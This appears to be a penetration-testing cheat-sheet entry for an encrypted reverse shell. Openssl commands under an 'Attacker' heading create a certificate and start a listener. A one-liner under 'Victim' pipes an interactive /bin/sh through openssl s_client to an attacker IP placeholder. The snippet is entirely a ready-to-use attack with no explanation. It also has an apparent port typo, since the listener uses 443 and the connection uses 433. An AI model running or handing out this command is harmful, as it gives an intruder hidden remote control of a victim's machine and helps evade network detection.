### Attacker
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
	openssl s_server -quiet -key key.pem -cert cert.pem -port 443
### Victim
	mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect [attacker ip]:433 > /tmp/x; rm  /tmp/x